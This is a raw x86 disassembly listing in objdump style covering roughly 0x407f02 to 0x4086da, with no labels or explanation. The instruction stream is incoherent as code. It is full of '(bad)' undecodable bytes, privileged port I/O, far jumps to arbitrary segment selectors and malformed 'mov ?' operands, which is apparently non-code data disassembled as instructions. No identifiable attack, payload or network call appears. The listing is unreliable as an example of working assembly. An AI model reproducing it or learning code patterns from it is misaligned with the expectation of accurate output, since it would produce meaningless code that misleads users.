  407f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f03:	jmp    0x407ef9
  407f05:	fdivr  DWORD PTR [eax+0x7d]
  407f08:	(bad)  
  407f0a:	pusha  
  407f0b:	ss cdq 
  407f0d:	dec    ebp
  407f0e:	push   eax
  407f0f:	xor    BYTE PTR [edi+0x55],dl
  407f12:	in     al,dx
  407f13:	add    DWORD PTR [ebx-0x4d],ecx
  407f16:	ficomp DWORD PTR [eax+0x32b66705]
  407f1c:	(bad)  
  407f1d:	cmc    
  407f1e:	dec    eax
  407f1f:	nop
  407f20:	push   ss
  407f21:	inc    eax
  407f22:	add    BYTE PTR [ecx+0x7bf8abdb],ah
  407f28:	adc    eax,DWORD PTR [esp+eax*4]
  407f2b:	mov    cl,0xe9
  407f2d:	bound  edx,QWORD PTR [eax]
  407f2f:	pop    edi
  407f30:	popf   
  407f31:	inc    ecx
  407f32:	jle    0x407f37
  407f34:	je     0x407f35
  407f36:	xchg   esp,eax
  407f37:	in     al,0x6e
  407f39:	pusha  
  407f3a:	daa    
  407f3b:	arpl   cx,cx
  407f3d:	or     al,ch
  407f3f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407f41:	cmp    al,0x96
  407f43:	pop    ds
  407f44:	in     eax,0xd7
  407f46:	mov    al,0x96
  407f48:	dec    esp
  407f49:	int    0xdc
  407f4b:	mov    dl,0x57
  407f4d:	jae    0x407f38
  407f4f:	fbld   TBYTE PTR [edi+eax*1-0x43]
  407f53:	xor    DWORD PTR [edi-0x5f],ebx
  407f56:	outs   dx,DWORD PTR ds:[esi]
  407f57:	xchg   ebx,eax
  407f58:	retf   0x789d
  407f5b:	shr    BYTE PTR [edi+0x5d],1
  407f5e:	dec    ecx
  407f5f:	call   0x30c082dd
  407f64:	out    0x37,al
  407f66:	push   ecx
  407f67:	pop    edi
  407f68:	lahf   
  407f69:	(bad)
  407f6e:	rcl    dh,cl
  407f70:	aad    0xbc
  407f72:	pop    edx
  407f73:	lahf   
  407f74:	call   0x4275:0x847c9656
  407f7b:	push   esp
  407f7c:	and    eax,0xef63d015
  407f81:	cld    
  407f82:	push   0xffffff83
  407f84:	add    cl,ch
  407f86:	add    DWORD PTR [edx],eax
  407f88:	popa   
  407f89:	nop
  407f8a:	jle    0x407f78
  407f8c:	stos   DWORD PTR es:[edi],eax
  407f8d:	fdivr  st(7),st
  407f8f:	cmc    
  407f90:	into   
  407f91:	fmul   QWORD PTR [esi-0x59992045]
  407f97:	faddp  st(3),st
  407f99:	out    dx,eax
  407f9a:	jecxz  0x407fe4
  407f9c:	stos   DWORD PTR es:[edi],eax
  407f9d:	popf   
  407f9e:	push   esp
  407f9f:	cmp    DWORD PTR [ebx],0x7333b82b
  407fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fa6:	push   ds
  407fa7:	xor    DWORD PTR [eax],ebp
  407fa9:	mov    eax,ds:0x85999143
  407fae:	mov    al,ds:0xd304ec0d
  407fb3:	(bad)  [esi+0x50c92838]
  407fb9:	cld    
  407fba:	mov    esi,0xa3d6966a
  407fbf:	xchg   ebx,eax
  407fc0:	cmc    
  407fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fc2:	xchg   ebx,eax
  407fc3:	push   es
  407fc4:	in     eax,0xe7
  407fc6:	mov    edx,esi
  407fc8:	call   0x3d19:0xee9aad26
  407fcf:	xchg   ecx,eax
  407fd0:	ret    
  407fd1:	sub    al,0xb0
  407fd3:	idiv   BYTE PTR [ebx-0x220f9947]
  407fd9:	jle    0x407fec
  407fdb:	int    0x6d
  407fdd:	inc    esp
  407fde:	mov    edi,esp
  407fe0:	cli    
  407fe1:	(bad)  
  407fe2:	push   esp
  407fe3:	dec    esp
  407fe4:	jbe    0x407fbc
  407fe6:	inc    ecx
  407fe7:	loopne 0x408039
  407fe9:	sahf   
  407fea:	push   esp
  407feb:	(bad)  
  407fec:	fiadd  DWORD PTR [edi-0x2ad0c99]
  407ff2:	clc    
  407ff3:	leave  
  407ff4:	push   edx
  407ff5:	daa    
  407ff6:	lods   eax,DWORD PTR ds:[esi]
  407ff7:	in     eax,dx
  407ff8:	cdq    
  407ff9:	ins    DWORD PTR es:[edi],dx
  407ffa:	dec    eax
  407ffb:	or     BYTE PTR [ebx],ch
  407ffd:	pop    ecx
  407ffe:	adc    eax,0x31d1a040
  408003:	cwde   
  408004:	sbb    al,0xbb
  408006:	cmp    ebp,DWORD PTR [eax-0x7670d8d]
  40800c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40800d:	lea    edx,[edi]
  40800f:	add    bl,bl
  408011:	mov    ds:0xc0178c81,eax
  408016:	mov    dh,0x1e
  408018:	mov    edi,0xd04012d0
  40801d:	adc    eax,DWORD PTR [eax-0x3bfa1b69]
  408023:	jmp    0x537a:0x7128e12c
  40802a:	jl     0x40806c
  40802c:	push   0xfffffffd
  40802e:	call   FWORD PTR [ecx]
  408030:	add    eax,DWORD PTR [eax+0x5217d5d9]
  408036:	dec    edi
  408037:	xchg   BYTE PTR [edi+0x7010f109],bl
  40803d:	fwait
  40803e:	dec    ecx
  40803f:	push   ecx
  408040:	mov    cs,ecx
  408042:	xor    DWORD PTR [esi-0xf],ebx
  408045:	cmp    eax,0xbdab0ada
  40804a:	stos   DWORD PTR es:[edi],eax
  40804b:	or     al,0xa2
  40804d:	sub    dl,ah
  40804f:	mov    ecx,0x55e194aa
  408054:	xor    eax,0x2574db47
  408059:	out    0xaf,al
  40805b:	or     eax,0x5b325074
  408060:	sahf   
  408061:	xlat   BYTE PTR ds:[ebx]
  408062:	es pop ebx
  408064:	sub    bl,al
  408066:	fwait
  408067:	push   esp
  408068:	pop    ebx
  408069:	mov    eax,0x81a0cd5d
  40806e:	jge    0x408095
  408070:	adc    BYTE PTR [edx-0x6de3f3b4],ah
  408076:	outs   dx,DWORD PTR ds:[esi]
  408077:	mov    al,ds:0x181839cf
  40807c:	scas   eax,DWORD PTR es:[edi]
  40807d:	lods   eax,DWORD PTR ds:[esi]
  40807e:	nop
  40807f:	hlt    
  408080:	js     0x408040
  408082:	sbb    al,0xd6
  408084:	fild   WORD PTR [ebx]
  408086:	add    al,0x1e
  408088:	jb     0x4080df
  40808a:	push   edx
  40808b:	push   edx
  40808c:	leave  
  40808d:	shr    DWORD PTR [ebx-0x2772c6c4],1
  408093:	jg     0x408048
  408095:	cli    
  408096:	inc    edi
  408097:	jl     0x4080f6
  408099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40809a:	push   edx
  40809b:	and    dl,dl
  40809d:	pop    ebp
  40809e:	push   ecx
  40809f:	cmp    eax,0x8a0ef40f
  4080a4:	in     al,0x27
  4080a6:	in     eax,dx
  4080a7:	rcl    cl,cl
  4080a9:	mov    DWORD PTR [eax],esi
  4080ab:	add    al,0xae
  4080ad:	sub    edx,DWORD PTR [esi]
  4080af:	call   0xdc3eae1a
  4080b4:	jmp    0x764f:0xeeaf3d8c
  4080bb:	ror    DWORD PTR [ebp+0x379919f9],1
  4080c1:	pop    es
  4080c2:	stc    
  4080c3:	dec    esi
  4080c4:	push   edi
  4080c5:	jmp    0x24af:0xa76ec45
  4080cc:	je     0x4080fc
  4080ce:	push   edx
  4080cf:	inc    eax
  4080d0:	sub    BYTE PTR [eax],al
  4080d2:	test   ch,ch
  4080d4:	fcomp  QWORD PTR [ebx]
  4080d6:	inc    esp
  4080d7:	js     0x408095
  4080d9:	xor    al,0x30
  4080dc:	call   0x54e9691e
  4080e1:	dec    edi
  4080e2:	mov    eax,0x42e3a049
  4080e7:	int3   
  4080e8:	test   esi,ebx
  4080ea:	mov    ch,ah
  4080ec:	lods   eax,DWORD PTR ds:[esi]
  4080ed:	test   al,0x4f
  4080ef:	jp     0x408114
  4080f1:	or     eax,0x91fedc92
  4080f6:	mov    al,0x49
  4080f8:	in     al,0xcc
  4080fa:	(bad)  
  4080fb:	cmp    ebp,DWORD PTR [ebx+0x28e9217b]
  408101:	imul   eax,eax,0xaba70248
  408107:	cmp    eax,0x4abc57f4
  40810c:	ret    0xbf0f
  40810f:	bound  esi,QWORD PTR [eax-0x26418e4d]
  408115:	aaa    
  408116:	push   ds
  408117:	test   BYTE PTR [eax+0x1a],ah
  40811a:	clc    
  40811b:	push   esi
  40811c:	popf   
  40811d:	xor    esp,ebx
  40811f:	xchg   edx,eax
  408120:	mov    edi,ebp
  408122:	fsubp  st(2),st
  408124:	add    al,0x95
  408126:	(bad)  
  408127:	out    0x33,eax
  408129:	mov    cl,0x29
  40812b:	fs imul ebp,eax,0x18ce6d68
  408132:	aam    0x28
  408134:	xor    BYTE PTR [ecx-0xd],al
  408137:	inc    ebp
  408138:	mov    cl,0x66
  40813a:	ds pop eax
  40813c:	inc    ebx
  40813d:	mov    eax,DWORD PTR [ecx+0x413f6d80]
  408143:	sub    DWORD PTR [eax+ebp*4],esi
  408146:	adc    BYTE PTR [edi+0xe4b76a9],bl
  40814c:	add    DWORD PTR [eax+0x0],eax
  40814f:	push   esi
  408150:	out    dx,eax
  408151:	or     bl,BYTE PTR [ecx-0x7f453bf8]
  408157:	inc    ebx
  408158:	(bad)  
  408159:	(bad)
  40815d:	add    al,0x9
  40815f:	inc    edi
  408160:	add    dl,BYTE PTR [edx-0x44]
  408163:	mov    ds:0xf20c02a2,eax
  408168:	cmp    edi,edi
  40816a:	aam    0x3e
  40816c:	sub    esi,DWORD PTR [ecx]
  40816e:	add    BYTE PTR [eax+0x27],ch
  408171:	mov    esp,0xe85a6924
  408176:	cmp    bl,BYTE PTR ds:[ebx]
  408179:	mov    dl,0x41
  40817b:	stc    
  40817c:	ins    BYTE PTR es:[edi],dx
  40817d:	test   al,0x95
  40817f:	daa    
  408180:	add    cl,cl
  408182:	cs jecxz 0x4081c1
  408185:	pop    ds
  408186:	adc    BYTE PTR ds:0x618ea1ea,dl
  40818c:	mov    esi,0xf35e854b
  408191:	das    
  408192:	push   ds
  408193:	dec    edx
  408194:	hlt    
  408195:	enter  0xc70e,0x17
  408199:	inc    ebp
  40819a:	sub    dh,BYTE PTR [ebp+ebp*8-0x28]
  40819e:	adc    al,0x5d
  4081a0:	mov    ss:0xb22e6676,al
  4081a6:	outs   dx,BYTE PTR ds:[esi]
  4081a7:	std    
  4081a8:	sub    dl,BYTE PTR [esi-0x1d]
  4081ab:	(bad)  
  4081ac:	push   ebx
  4081ad:	sub    eax,esp
  4081af:	imul   edx,DWORD PTR [eax-0x14],0xffffff8e
  4081b3:	push   edx
  4081b4:	jnp    0x40819f
  4081b6:	xor    al,0xcb
  4081b8:	add    al,0x3
  4081ba:	push   edx
  4081bb:	mov    ebp,0xd775d917
  4081c0:	(bad)  
  4081c1:	addr16 and eax,0xb3a1005f
  4081c7:	fwait
  4081c8:	pop    ecx
  4081c9:	push   edx
  4081ca:	xor    al,BYTE PTR [edx]
  4081cc:	pop    esi
  4081cd:	xor    BYTE PTR [edx-0x32],ch
  4081d0:	ss inc esi
  4081d2:	fninit 
  4081d4:	xchg   BYTE PTR [ecx+0x67edef6b],bh
  4081da:	aas    
  4081db:	add    DWORD PTR [eax+0x7e3df580],0xffffff87
  4081e2:	mov    al,ds:0xb5c6ddb3
  4081e7:	in     eax,dx
  4081e8:	iret   
  4081e9:	out    dx,eax
  4081ea:	pop    ebx
  4081eb:	mov    cl,0x6f
  4081ed:	cmp    edx,ebp
  4081ef:	js     0x4081f4
  4081f1:	lock pop ecx
  4081f3:	push   0xffffffc1
  4081f5:	push   ds
  4081f6:	test   BYTE PTR [edi+0x63a9f54b],bl
  4081fc:	cmp    ah,BYTE PTR [eax]
  4081fe:	or     cl,al
  408200:	pop    edi
  408201:	enter  0x283b,0x9f
  408205:	bnd call 0x97bb2f5a
  40820b:	jbe    0x40820c
  40820d:	fwait
  40820e:	test   DWORD PTR [edi+0x78],0x9bf3638e
  408215:	in     eax,dx
  408216:	cmp    al,0x3f
  408218:	stos   DWORD PTR es:[edi],eax
  408219:	or     al,0x9a
  40821b:	mov    edi,0x241dcbc6
  408220:	inc    sp
  408222:	or     esp,DWORD PTR [esi-0x58]
  408225:	jne    0x4081e3
  408227:	and    BYTE PTR [ecx],0x3
  40822a:	push   es
  40822b:	add    dl,ch
  40822d:	xor    BYTE PTR [eax+0x68],ah
  408230:	add    BYTE PTR [eax+0xf7ec139],al
  408236:	push   cs
  408237:	scas   al,BYTE PTR es:[edi]
  408238:	(bad)  
  408239:	lock sbb ah,bl
  40823c:	xor    ecx,ecx
  40823e:	add    edx,ebx
  408240:	(bad)  
  408241:	mov    WORD PTR [edi+edx*8],es
  408244:	cdq    
  408245:	inc    esp
  408246:	jecxz  0x408211
  408248:	ss into 
  40824a:	jmp    0x1b5c:0x7b52e071
  408251:	(bad)  
  408252:	xchg   esp,eax
  408253:	clc    
  408254:	out    dx,eax
  408255:	jmp    0x40824b
  408257:	pop    edx
  408258:	jne    0x408217
  40825a:	jmp    0x4082a4
  40825c:	xor    DWORD PTR [edx-0xf767847],esp
  408262:	cmp    ah,cl
  408264:	iret   
  408265:	or     eax,0xbf177998
  40826a:	push   0x2c
  40826c:	rol    BYTE PTR [eax],cl
  40826e:	cmp    DWORD PTR [edi+0x5294e8ee],0x7aa2b0d1
  408278:	xchg   ecx,eax
  408279:	mov    dh,0x6
  40827b:	add    BYTE PTR [eax-0x5c],al
  40827e:	inc    esp
  40827f:	pop    eax
  408280:	gs ins DWORD PTR es:[edi],dx
  408282:	mov    edx,0x3d85bf4a
  408287:	loopne 0x408285
  408289:	push   edx
  40828a:	inc    ebx
  40828b:	fidiv  DWORD PTR [eax]
  40828d:	sbb    eax,0x5dd4c304
  408292:	xor    al,0x7f
  408294:	stos   DWORD PTR es:[edi],eax
  408295:	push   0x7b
  408297:	jb     0x4082c5
  408299:	vpsrld ymm1,ymm2,XMMWORD PTR [esp+ebx*4+0x66e7c0]
  4082a2:	pusha  
  4082a3:	mov    edi,0x10201763
  4082a8:	ret    0xe187
  4082ab:	cli    
  4082ac:	cmp    DWORD PTR [ebp-0x20],0xffffffe9
  4082b0:	mov    DWORD PTR [edx+0xc562900],eax
  4082b6:	push   ebp
  4082b7:	idiv   DWORD PTR [esi+0x2506fe5f]
  4082bd:	cld    
  4082be:	xchg   ebx,eax
  4082bf:	repnz pop esi
  4082c1:	pusha  
  4082c2:	rol    al,0x7e
  4082c5:	add    al,0xc8
  4082c7:	add    al,0xc4
  4082c9:	mov    ch,0xfe
  4082cb:	xchg   esp,eax
  4082cc:	push   ss
  4082cd:	add    al,BYTE PTR [eax-0x5a212de1]
  4082d3:	xor    BYTE PTR [ecx+0xbbf1673],bh
  4082d9:	jae    0x4082e6
  4082db:	(bad)  
  4082dc:	pop    eax
  4082dd:	scas   eax,DWORD PTR es:[edi]
  4082de:	mov    bh,0xc2
  4082e0:	push   es
  4082e1:	push   eax
  4082e2:	test   al,0x37
  4082e4:	or     al,0xc2
  4082e6:	clc    
  4082e7:	(bad)  
  4082e8:	pop    esi
  4082e9:	pop    edi
  4082ea:	test   eax,0xcafa974a
  4082ef:	jb     0x4082f0
  4082f1:	pop    edi
  4082f2:	push   ebx
  4082f3:	stos   DWORD PTR es:[edi],eax
  4082f4:	and    eax,0x759b0e9a
  4082f9:	in     al,0x58
  4082fb:	(bad)  
  4082fc:	out    dx,eax
  4082fd:	jb     0x4082f9
  4082ff:	jmp    0x3d4d5d96
  408304:	rcl    esi,1
  408306:	daa    
  408307:	push   edx
  408308:	shld   DWORD PTR [edx+0x4e860676],edi,0x96
  408310:	xchg   BYTE PTR [esi+0xb],ah
  408313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408314:	add    eax,0x21bb3f2c
  408319:	dec    edx
  40831a:	pop    ss
  40831b:	dec    esi
  40831c:	push   ss
  40831d:	inc    ebp
  40831e:	pushf  
  40831f:	xchg   DWORD PTR [ebp+0x26d26101],ecx
  408325:	lea    edi,[eax]
  408327:	or     al,0x4
  408329:	adc    BYTE PTR [ecx],0x74
  40832c:	popa   
  40832d:	jecxz  0x408395
  40832f:	dec    ebx
  408330:	mov    eax,0xd7e7a592
  408335:	sbb    edx,DWORD PTR [edx+0x0]
  408338:	aam    0x0
  40833a:	mov    eax,0x16f5db81
  40833f:	jno    0x408311
  408341:	repz jmp 0x408340
  408344:	adc    BYTE PTR ds:0xb7f0791a,bl
  40834a:	dec    edx
  40834b:	adc    dl,BYTE PTR [ebx+0x36]
  40834e:	call   0x76eb:0xdcfbe88f
  408355:	int    0xeb
  408357:	iret   
  408358:	push   ecx
  408359:	scas   eax,DWORD PTR es:[edi]
  40835a:	dec    ebp
  40835b:	mov    dh,0xab
  40835d:	sti    
  40835e:	xchg   esp,eax
  40835f:	add    al,0xc
  408361:	int    0x1
  408363:	mov    DWORD PTR [ecx],eax
  408365:	add    dh,BYTE PTR [ebx-0x22]
  408368:	in     eax,dx
  408369:	sub    al,0x55
  40836b:	mov    ds:0x8f8128a,eax
  408370:	adc    eax,0xa0963c85
  408375:	ds xchg esp,eax
  408377:	fwait
  408378:	adc    bl,bl
  40837a:	sbb    esp,ebp
  40837c:	ds sti 
  40837e:	push   0xa0d8017e
  408383:	adc    al,0x0
  408385:	xor    ah,BYTE PTR [ecx]
  408387:	ret    
  408388:	mov    ?,esi
  40838a:	ins    BYTE PTR es:[edi],dx
  40838b:	js     0x408367
  40838d:	out    0x73,al
  40838f:	add    DWORD PTR [eax+0x39b15c60],eax
  408395:	shl    DWORD PTR [edx+ecx*2-0x28],1
  408399:	jmp    0x35a9:0x5d8f408f
  4083a0:	cmp    dl,BYTE PTR [edx-0x66059ab5]
  4083a6:	aad    0x1f
  4083a8:	xchg   ebx,eax
  4083a9:	stc    
  4083aa:	mov    ah,0xce
  4083ac:	mov    ebp,0xc3a06fc6
  4083b1:	in     eax,dx
  4083b2:	data16 xor al,0xdc
  4083b5:	scas   al,BYTE PTR es:[edi]
  4083b6:	sbb    esi,DWORD PTR [edi+0x619551dd]
  4083bc:	xchg   ebp,eax
  4083bd:	(bad)  
  4083be:	pop    edi
  4083bf:	pop    ss
  4083c0:	mov    dl,0x70
  4083c2:	out    0xf4,al
  4083c4:	inc    esi
  4083c5:	mov    BYTE PTR [esi+edi*2],bh
  4083c8:	pusha  
  4083c9:	xchg   esp,eax
  4083ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083cc:	shl    BYTE PTR [eax+0x7d2015b2],0xf2
  4083d3:	scas   al,BYTE PTR es:[edi]
  4083d4:	jl     0x408358
  4083d6:	mov    esi,0xc452b437
  4083db:	jl     0x4083ed
  4083dd:	jl     0x4083ce
  4083df:	fstp   TBYTE PTR [edx]
  4083e2:	sbb    bh,bl
  4083e4:	mov    ah,0x99
  4083e6:	mov    ?,WORD PTR [ebp-0x47918d49]
  4083ec:	rcr    DWORD PTR [edx+0x2066fc4c],1
  4083f2:	shr    BYTE PTR [edx+edx*1+0x5],1
  4083f6:	sbb    DWORD PTR [edx-0x4167ffeb],esp
  4083fc:	or     al,0x8b
  4083fe:	mov    eax,ds:0x820f4830
  408403:	dec    ebx
  408404:	rcl    al,cl
  408406:	add    DWORD PTR [edi],ebp
  408408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408409:	mov    WORD PTR [edi+0x3c],cs
  40840c:	popa   
  40840d:	xsave  ss:[esi-0x534c1ccd]
  408415:	addr16 sahf 
  408417:	ins    BYTE PTR es:[edi],dx
  408418:	in     al,dx
  408419:	pop    edx
  40841a:	fs push esp
  40841c:	add    BYTE PTR [ebx+ebx*8],bh
  40841f:	push   ds
  408420:	pop    edx
  408421:	mov    eax,0x49cd1022
  408426:	xor    al,0xad
  408428:	fcmovu st,st(5)
  40842a:	mov    cl,ah
  40842c:	xor    DWORD PTR fs:[edi+0x6d9227b3],edi
  408433:	out    0xb0,eax
  408435:	pop    ss
  408436:	mov    DWORD PTR [ecx],edx
  408438:	call   0x8c15:0x2e3c1a9f
  40843f:	cmc    
  408440:	std    
  408441:	jge    0x408478
  408443:	jns    0x408466
  408445:	jbe    0x4084c6
  408447:	call   0xe84d:0xc24f8f17
  40844e:	je     0x40841b
  408450:	sahf   
  408451:	jge    0x408483
  408453:	inc    cl
  408455:	mov    edx,0x48aa828e
  40845a:	leave  
  40845b:	cmp    eax,0x2d929de3
  408460:	mov    ecx,0x7b9bfab0
  408465:	sbb    DWORD PTR [edx-0x25],ebx
  408468:	ror    DWORD PTR [esi+0x6f],cl
  40846b:	ficomp DWORD PTR [edx-0x1103a05c]
  408471:	mov    eax,ds:0xe34dd146
  408476:	jns    0x40842a
  408478:	sti    
  408479:	pusha  
  40847a:	test   eax,0x9a985bd2
  40847f:	mov    ebx,0x16ce683
  408484:	pop    eax
  408485:	mov    al,ds:0xd85520ee
  40848a:	(bad)  
  40848b:	aam    0xd
  40848d:	add    ah,0x26
  408490:	and    edx,ebp
  408492:	cmp    al,0x3e
  408494:	jno    0x408435
  408496:	aad    0x36
  408498:	out    0x5,al
  40849a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40849b:	mov    ah,bl
  40849d:	(bad)  
  40849e:	lahf   
  40849f:	jecxz  0x408484
  4084a1:	ja     0x408504
  4084a3:	mov    esi,DWORD PTR [edi]
  4084a5:	mov    ebp,0xf95993c3
  4084aa:	lahf   
  4084ab:	sub    DWORD PTR [ebp-0x39e7c2dc],edx
  4084b1:	aas    
  4084b2:	xor    edi,DWORD PTR [esi]
  4084b4:	and    BYTE PTR [ebx],bl
  4084b6:	add    BYTE PTR [eax],dl
  4084b8:	inc    esp
  4084b9:	div    DWORD PTR [edi-0x55]
  4084bc:	pop    es
  4084bd:	sub    ch,cl
  4084bf:	cli    
  4084c0:	push   es
  4084c1:	mov    esp,ss
  4084c3:	and    BYTE PTR [edi+ecx*4+0x5da72dff],dl
  4084ca:	jmp    0x4c2d:0xabee803f
  4084d1:	push   DWORD PTR [esi+0x316b3f81]
  4084d7:	mov    ecx,0x81fcb0a1
  4084dc:	push   es
  4084dd:	add    BYTE PTR [eax-0x3424f23f],bl
  4084e3:	das    
  4084e4:	int3   
  4084e5:	ret    0x39fb
  4084e8:	popf   
  4084e9:	sbb    ebp,DWORD PTR [edi]
  4084eb:	stc    
  4084ec:	aad    0xe2
  4084ee:	pop    ecx
  4084ef:	push   ebp
  4084f0:	add    BYTE PTR [eax-0x2dacf440],al
  4084f6:	mov    ecx,0xc4544f5d
  4084fb:	stc    
  4084fc:	fwait
  4084fd:	cli    
  4084fe:	jns    0x40853b
  408500:	repz xchg ecx,eax
  408502:	shl    BYTE PTR [edx*2-0x70e597f1],0x7b
  40850a:	out    dx,al
  40850b:	loop   0x4084e4
  40850d:	jp     0x408561
  40850f:	test   BYTE PTR [eax],0x9b
  408512:	sar    DWORD PTR ss:[ebx+ebp*2+0x3c],cl
  408517:	(bad)  
  408518:	int    0xfb
  40851a:	stos   BYTE PTR es:[edi],al
  40851b:	cmp    dh,BYTE PTR gs:[ecx-0x4c]
  40851f:	popf   
  408520:	cdq    
  408521:	and    al,dl
  408523:	popf   
  408524:	getsec 
  408526:	mov    DWORD PTR [edi],ebp
  408528:	loop   0x408545
  40852a:	fidivr DWORD PTR [eax+eax*4-0x6a]
  40852e:	mov    esi,0xc39fda2a
  408533:	hlt    
  408534:	std    
  408535:	mov    al,0x89
  408537:	mov    bl,0x14
  408539:	adc    BYTE PTR [eax],ah
  40853b:	imul   esp,edx,0xffffffda
  40853e:	int3   
  40853f:	adc    al,BYTE PTR [ecx+eax*1]
  408542:	mov    ah,0xf1
  408544:	(bad)  
  408545:	push   esp
  408546:	(bad)  
  408547:	fidiv  WORD PTR [ebp-0x2b7f9574]
  40854d:	push   esp
  40854e:	arpl   di,sp
  408550:	test   al,0x79
  408552:	arpl   dx,dx
  408554:	iret   
  408555:	xor    BYTE PTR [eax],cl
  408557:	(bad)  
  408558:	ds imul ecx
  40855b:	hlt    
  40855c:	test   BYTE PTR [eax*8+0x6a3e905e],dl
  408563:	inc    eax
  408564:	imul   esi,DWORD PTR cs:[ecx],0x6c
  408568:	mov    bl,0x76
  40856a:	xchg   DWORD PTR [ebp+0x56a54bf8],ebp
  408570:	adc    al,BYTE PTR [eax-0x27fffeaf]
  408576:	daa    
  408577:	repnz and ax,WORD PTR [di]
  40857c:	add    BYTE PTR [edi-0x15],dl
  40857f:	jae    0x408530
  408581:	ja     0x408593
  408583:	adc    al,0xa6
  408585:	adc    bh,BYTE PTR [edx+0x50]
  408588:	ins    DWORD PTR es:[edi],dx
  408589:	imul   esi,DWORD PTR [ebx+0x65],0x7fa4d25c
  408590:	shl    BYTE PTR [edi],cl
  408592:	inc    edx
  408593:	mov    ecx,0xcaaa31f1
  408598:	out    0x1d,al
  40859a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40859b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40859c:	shr    BYTE PTR [edi],cl
  40859e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40859f:	ret    
  4085a0:	popf   
  4085a1:	mov    esp,0xabc49898
  4085a6:	sub    esi,DWORD PTR [edi+0x2f5fa2ad]
  4085ac:	popf   
  4085ad:	mov    ds:0x8082dee2,al
  4085b2:	(bad)  
  4085b3:	pop    esi
  4085b4:	jge    0x408603
  4085b6:	mov    bl,0x3a
  4085b8:	push   es
  4085b9:	frstor [ebp+ecx*8-0x2c]
  4085bd:	xor    BYTE PTR [eax],0x0
  4085c0:	inc    eax
  4085c1:	sti    
  4085c2:	scas   eax,DWORD PTR es:[edi]
  4085c3:	aam    0xe7
  4085c5:	in     eax,dx
  4085c6:	aad    0x27
  4085c8:	jecxz  0x408584
  4085ca:	(bad)  
  4085cc:	fsub   DWORD PTR [eax+0x46ff4674]
  4085d2:	add    eax,0xec60a19f
  4085d7:	xchg   ebp,eax
  4085d8:	jo     0x4085d7
  4085da:	jmp    0x397f:0xb9e5adb6
  4085e1:	and    DWORD PTR [edx+0x79b9dd1],eax
  4085e7:	int3   
  4085e8:	or     esp,DWORD PTR [esi+0x32a7c03e]
  4085ee:	push   0xffffffeb
  4085f0:	jae    0x40857b
  4085f2:	adc    eax,0xa6300520
  4085f7:	pop    ebp
  4085f8:	mov    al,0x3f
  4085fa:	in     al,dx
  4085fb:	popa   
  4085fc:	push   cs
  4085fd:	inc    edx
  4085fe:	aam    0xe8
  408600:	jecxz  0x40858e
  408602:	push   0xffffff8e
  408604:	sub    al,0xaa
  408606:	mov    ch,cl
  408608:	(bad)  
  40860a:	adc    ah,dl
  40860c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860d:	jl     0x408650
  40860f:	mov    esp,0x3b5e7854
  408614:	add    esi,DWORD PTR [ebx*1-0x78cd430e]
  40861b:	add    ch,BYTE PTR [ebx]
  40861d:	aas    
  40861e:	enter  0x8606,0x8
  408622:	call   DWORD PTR [ecx+0x37]
  408625:	jg     0x40863f
  408627:	test   BYTE PTR [eax],cl
  408629:	out    dx,al
  40862a:	sbb    ebx,DWORD PTR [edi]
  40862c:	add    al,0x0
  40862e:	cmp    al,0x10
  408630:	ret    0x9125
  408633:	js     0x408698
  408635:	or     al,0x21
  408637:	fild   DWORD PTR [esi]
  408639:	(bad)  
  40863b:	rol    ah,1
  40863d:	pop    esp
  40863e:	and    al,BYTE PTR ds:0x32450000
  408644:	and    dh,al
  408646:	mov    esp,0x5c5da3b2
  40864b:	jns    0x408615
  40864d:	std    
  40864e:	ficomp WORD PTR [ecx]
  408650:	out    dx,eax
  408651:	bound  edi,QWORD PTR ds:0x1dde6550
  408657:	and    al,0x15
  408659:	xchg   esp,eax
  40865a:	arpl   WORD PTR [esi-0x426b7847],bp
  408660:	add    BYTE PTR [edx*1+0x1d3a4de1],al
  408667:	aam    0xd6
  408669:	xchg   ebx,eax
  40866a:	mov    ecx,es
  40866c:	shr    BYTE PTR [esi+esi*4-0x10],1
  408670:	je     0x4085f3
  408672:	daa    
  408673:	push   cs
  408674:	mov    edi,edx
  408676:	imul   BYTE PTR [esi]
  408678:	ret    0x6226
  40867b:	sub    al,0x6c
  40867d:	outs   dx,DWORD PTR ds:[esi]
  40867e:	mov    dh,0xc5
  408680:	cwde   
  408681:	mov    ecx,0x8cd18ad9
  408686:	inc    ecx
  408687:	into   
  408688:	inc    esi
  408689:	adc    dh,BYTE PTR [eax]
  40868b:	jg     0x408648
  40868d:	and    DWORD PTR [edi-0x3401016c],ebp
  408693:	push   ss
  408694:	or     BYTE PTR [eax-0x6bbbfe48],bl
  40869a:	popa   
  40869b:	sbb    ebx,DWORD PTR [bx+si]
  40869e:	cmp    al,0x3b
  4086a0:	xchg   ecx,eax
  4086a1:	mov    ch,0xa6
  4086a3:	int    0x36
  4086a5:	out    dx,eax
  4086a6:	rcr    BYTE PTR [ecx],1
  4086a8:	mov    eax,gs
  4086aa:	mov    edi,0x207e683b
  4086af:	shl    BYTE PTR [edx+0x36],1
  4086b2:	cmp    BYTE PTR [eax+ecx*1+0x30],0x34
  4086b7:	mov    ds:0x5b06a4c5,eax
  4086bc:	mov    dl,0xb1
  4086be:	or     eax,0xd9e648c4
  4086c3:	stos   BYTE PTR es:[edi],al
  4086c4:	lea    ebp,[edi+0x46]
  4086c7:	add    dh,BYTE PTR [eax]
  4086c9:	mov    ebx,0xbae618e3
  4086ce:	ds xchg ebp,eax
  4086d0:	push   0x14
  4086d2:	out    0x44,al
  4086d4:	inc    esi
  4086d5:	out    0x88,eax
  4086d7:	out    dx,eax
  4086d8:	mov    ecx,eax
  4086da:	imul   edx,DWORD PTR [eax-0x25],0x41
